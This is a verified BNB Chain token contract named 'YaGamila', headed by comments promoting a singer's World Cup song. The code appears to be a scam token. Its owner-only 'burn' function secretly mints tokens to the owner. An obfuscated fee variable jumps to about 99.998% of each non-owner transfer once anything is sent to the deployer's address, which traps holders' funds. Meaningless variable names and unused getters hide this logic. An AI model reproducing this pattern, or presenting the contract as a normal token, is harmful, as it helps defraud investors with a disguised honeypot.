/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
////////////////////////////////////////////////////////////////////////////
//السلام عليكم قطر
//This is my first time to Qatar and also to the Middle East for the World Cup 2022⚽!  
//Asalamualaikum Ya Gamila
//https://lnk.to/YaGamila
//https://youtu.be/H8nERjGhpPk
//https://www.tiktok.com/@namewee/video...
//https://www.instagram.com/reel/Ckp8jB...
//https://twitter.com/nameweemusic
////////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract PRLYTCZ {
uint256 private  RUWMWV = 10000000000;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  HKNRCJ = 1000000000000000000000;
uint256 private  ILDUTS = 100000000;
string public  symbol = "YaGamila";
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  ZUDNGI = address(0);
uint256 public constant DXZLOP = 99999;
address private  FRFKWY = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  STPLHO = 10000000000000;
uint256 private  BSUJYZ = 1000000000000000000;
address private  EGKWWB = address(0);
address private  WIPLSA = address(0);
string public  name = "YaGamila";
address private  KLTDUS = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  AMTGRI = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  EYVTGV = 1000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getRUWMWV() private returns (uint256) {
return RUWMWV;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getKLTDUS() private returns (address) {
return KLTDUS;
}

function _getILDUTS() private returns (uint256) {
return ILDUTS;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getEYVTGV() private returns (uint256) {
return EYVTGV;
}

function _getBSUJYZ() private returns (uint256) {
return BSUJYZ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
EGKWWB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getZUDNGI() private returns (address) {
return ZUDNGI;
}

function _getHKNRCJ() private returns (uint256) {
return HKNRCJ;
}

function _getSTPLHO() private returns (uint256) {
return STPLHO;
}

function _getFRFKWY() private returns (address) {
return FRFKWY;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tTHDJJM 0");
require(spender != address(0), "fTHDJJM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "THDJJM");
require(to != address(0), "THDJJM");
require(amount <= balanceOf[from], "THDJJM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DXZLOP/AMTGRI ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EGKWWB){
AMTGRI = DXZLOP+2;
}
emit Transfer(from, to, transferAmount);
}
function _getWIPLSA() private returns (address) {
return WIPLSA;
}


}